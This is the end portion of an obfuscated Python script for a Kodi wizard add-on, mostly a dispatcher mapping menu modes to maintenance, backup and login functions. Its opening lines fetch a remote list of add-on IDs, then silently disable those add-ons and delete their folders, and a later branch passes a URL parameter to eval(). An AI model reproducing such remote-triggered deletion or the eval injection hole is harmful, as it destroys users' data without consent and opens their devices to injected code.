			O0OOOOO0O0O0O0O0O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5549
			for OOOO00OOO0OOO0O0O in O0OOOOO0O0O0O0O0O :#line:5550
				OO0000OO000000O0O =OOOO00OOO0OOO0O0O .split (':')[1 ].strip ()#line:5552
				OOOOOO00OOOOO0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO0000OO000000O0O ,'false')#line:5553
				O00OOO0O0OOOOOO0O =xbmc .executeJSONRPC (OOOOOO00OOOOO0O0O )#line:5554
				O0000O00O0000OOO0 =json .loads (O00OOO0O0OOOOOO0O )#line:5555
				OO0OO00O0OOOO000O =os .path .join (user_folder ,OO0000OO000000O0O )#line:5557
				if os .path .exists (OO0OO00O0OOOO000O ):#line:5559
					for OO0O000O0O0OOOOOO ,OO00OOO0000O00O00 ,O00OO0OOO0OO0O00O in os .walk (OO0OO00O0OOOO000O ):#line:5560
						for O00O00O0OOOOO0000 in O00OO0OOO0OO0O00O :#line:5561
							os .unlink (os .path .join (OO0O000O0O0OOOOOO ,O00O00O0OOOOO0000 ))#line:5562
						for OO0OOO00000O0OOO0 in OO00OOO0000O00O00 :#line:5563
							shutil .rmtree (os .path .join (OO0O000O0O0OOOOOO ,OO0OOO00000O0OOO0 ))#line:5564
					os .rmdir (OO0OO00O0OOOO000O )#line:5565
	except :pass #line:5567
params =get_params ()#line:5568
url =None #line:5569
name =None #line:5570
mode =None #line:5571
try :mode =urllib .unquote_plus (params ["mode"])#line:5573
except :pass #line:5574
try :name =urllib .unquote_plus (params ["name"])#line:5575
except :pass #line:5576
try :url =urllib .unquote_plus (params ["url"])#line:5577
except :pass #line:5578
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5580
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5581
def setView (O0O00O0OO0O00OOO0 ,OOOOO0O00000OO000 ):#line:5582
	if wiz .getS ('auto-view')=='true':#line:5583
		OOO0000OOO0O0O0O0 =wiz .getS (OOOOO0O00000OO000 )#line:5584
		if OOO0000OOO0O0O0O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOO0000OOO0O0O0O0 ='55'#line:5585
		if OOO0000OOO0O0O0O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOO0000OOO0O0O0O0 ='50'#line:5586
		wiz .ebi ("Container.SetViewMode(%s)"%OOO0000OOO0O0O0O0 )#line:5587
if mode ==None :index ()#line:5589
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5591
elif mode =='builds':buildMenu ()#line:5592
elif mode =='viewbuild':viewBuild (name )#line:5593
elif mode =='buildinfo':buildInfo (name )#line:5594
elif mode =='buildpreview':buildVideo (name )#line:5595
elif mode =='install':buildWizard (name ,url )#line:5596
elif mode =='theme':buildWizard (name ,mode ,url )#line:5597
elif mode =='viewthirdparty':viewThirdList (name )#line:5598
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5599
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5600
elif mode =='maint':maintMenu (name )#line:5602
elif mode =='passpin':passandpin ()#line:5603
elif mode =='backmyupbuild':backmyupbuild ()#line:5604
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5605
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5606
elif mode =='advancedsetting':advancedWindow (name )#line:5607
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5608
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5609
elif mode =='asciicheck':wiz .asciiCheck ()#line:5610
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5611
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5612
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5613
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5614
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5615
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5616
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5617
elif mode =='currentsettings':viewAdvanced ()#line:5618
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5619
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5620
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5621
elif mode =='fixskin':backtokodi ()#line:5622
elif mode =='testcommand':testcommand ()#line:5623
elif mode =='logsend':logsend ()#line:5624
elif mode =='rdon':rdon ()#line:5625
elif mode =='rdoff':rdoff ()#line:5626
elif mode =='setrd':setrealdebrid ()#line:5627
elif mode =='setrd2':setautorealdebrid ()#line:5628
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5629
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5630
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5631
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5632
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5633
elif mode =='freshstart':freshStart ()#line:5634
elif mode =='forceupdate':wiz .forceUpdate ()#line:5635
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5636
elif mode =='forceclose':wiz .killxbmc ()#line:5637
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5638
elif mode =='hidepassword':wiz .hidePassword ()#line:5639
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5640
elif mode =='enableaddons':enableAddons ()#line:5641
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5642
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5643
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5644
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5645
elif mode =='uploadlog':uploadLog .Main ()#line:5646
elif mode =='viewlog':LogViewer ()#line:5647
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5648
elif mode =='viewerrorlog':errorChecking (all =True )#line:5649
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5650
elif mode =='purgedb':purgeDb ()#line:5651
elif mode =='fixaddonupdate':fixUpdate ()#line:5652
elif mode =='removeaddons':removeAddonMenu ()#line:5653
elif mode =='removeaddon':removeAddon (name )#line:5654
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5655
elif mode =='removedata':removeAddonData (name )#line:5656
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5657
elif mode =='systeminfo':systemInfo ()#line:5658
elif mode =='restorezip':restoreit ('build')#line:5659
elif mode =='restoregui':restoreit ('gui')#line:5660
elif mode =='restoreaddon':restoreit ('addondata')#line:5661
elif mode =='restoreextzip':restoreextit ('build')#line:5662
elif mode =='restoreextgui':restoreextit ('gui')#line:5663
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5664
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5665
elif mode =='traktsync':traktsync ()#line:5666
elif mode =='apk':apkMenu (name )#line:5668
elif mode =='apkscrape':apkScraper (name )#line:5669
elif mode =='apkinstall':apkInstaller (name ,url )#line:5670
elif mode =='speed':speedMenu ()#line:5671
elif mode =='net':net_tools ()#line:5672
elif mode =='GetList':GetList (url )#line:5673
elif mode =='youtube':youtubeMenu (name )#line:5674
elif mode =='viewVideo':playVideo (url )#line:5675
elif mode =='addons':addonMenu (name )#line:5677
elif mode =='addoninstall':addonInstaller (name ,url )#line:5678
elif mode =='savedata':saveMenu ()#line:5680
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5681
elif mode =='managedata':manageSaveData (name )#line:5682
elif mode =='whitelist':wiz .whiteList (name )#line:5683
elif mode =='trakt':traktMenu ()#line:5685
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5686
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5687
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5688
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5689
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5690
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5691
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5692
elif mode =='realdebrid':realMenu ()#line:5694
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5695
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5696
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5697
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5698
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5699
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5700
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5701
elif mode =='login':loginMenu ()#line:5703
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5704
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5705
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5706
elif mode =='clearlogin':loginit .clearSaved (name )#line:5707
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5708
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5709
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5710
elif mode =='contact':notify .contact (CONTACT )#line:5712
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5713
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5714
elif mode =='developer':developer ()#line:5716
elif mode =='converttext':wiz .convertText ()#line:5717
elif mode =='createqr':wiz .createQR ()#line:5718
elif mode =='testnotify':testnotify ()#line:5719
elif mode =='testnotify2':testnotify2 ()#line:5720
elif mode =='servicemanual':servicemanual ()#line:5721
elif mode =='fastinstall':fastinstall ()#line:5722
elif mode =='testupdate':testupdate ()#line:5723
elif mode =='testfirst':testfirst ()#line:5724
elif mode =='testfirstrun':testfirstRun ()#line:5725
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5726
elif mode =='bg':wiz .bg_install (name ,url )#line:5728
elif mode =='bgcustom':wiz .bg_custom ()#line:5729
elif mode =='bgremove':wiz .bg_remove ()#line:5730
elif mode =='bgdefault':wiz .bg_default ()#line:5731
elif mode =='rdset':rdsetup ()#line:5732
elif mode =='mor':morsetup ()#line:5733
elif mode =='mor2':morsetup2 ()#line:5734
elif mode =='resolveurl':resolveurlsetup ()#line:5735
elif mode =='urlresolver':urlresolversetup ()#line:5736
elif mode =='forcefastupdate':forcefastupdate ()#line:5737
elif mode =='traktset':traktsetup ()#line:5738
elif mode =='placentaset':placentasetup ()#line:5739
elif mode =='flixnetset':flixnetsetup ()#line:5740
elif mode =='reptiliaset':reptiliasetup ()#line:5741
elif mode =='yodasset':yodasetup ()#line:5742
elif mode =='numbersset':numberssetup ()#line:5743
elif mode =='uranusset':uranussetup ()#line:5744
elif mode =='genesisset':genesissetup ()#line:5745
elif mode =='fastupdate':fastupdate ()#line:5746
elif mode =='folderback':folderback ()#line:5747
elif mode =='menudata':Menu ()#line:5748
elif mode ==2 :#line:5750
        wiz .torent_menu ()#line:5751
elif mode ==3 :#line:5752
        wiz .popcorn_menu ()#line:5753
elif mode ==8 :#line:5754
        wiz .metaliq_fix ()#line:5755
elif mode ==9 :#line:5756
        wiz .quasar_menu ()#line:5757
elif mode ==5 :#line:5758
        swapSkins ('skin.Premium.mod')#line:5759
elif mode ==13 :#line:5760
        wiz .elementum_menu ()#line:5761
elif mode ==16 :#line:5762
        wiz .fix_wizard ()#line:5763
elif mode ==17 :#line:5764
        wiz .last_play ()#line:5765
elif mode ==18 :#line:5766
        wiz .normal_metalliq ()#line:5767
elif mode ==19 :#line:5768
        wiz .fast_metalliq ()#line:5769
elif mode ==20 :#line:5770
        wiz .fix_buffer2 ()#line:5771
elif mode ==21 :#line:5772
        wiz .fix_buffer3 ()#line:5773
elif mode ==11 :#line:5774
        wiz .fix_buffer ()#line:5775
elif mode ==15 :#line:5776
        wiz .fix_font ()#line:5777
elif mode ==14 :#line:5778
        wiz .clean_pass ()#line:5779
elif mode ==22 :#line:5780
        wiz .movie_update ()#line:5781
elif mode =='adv_settings':buffer1 ()#line:5782
elif mode =='getpass':getpass ()#line:5783
elif mode =='setpass':setpass ()#line:5784
elif mode =='setuname':setuname ()#line:5785
elif mode =='passandUsername':passandUsername ()#line:5786
elif mode =='9':disply_hwr ()#line:5787
elif mode =='99':disply_hwr2 ()#line:5788
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))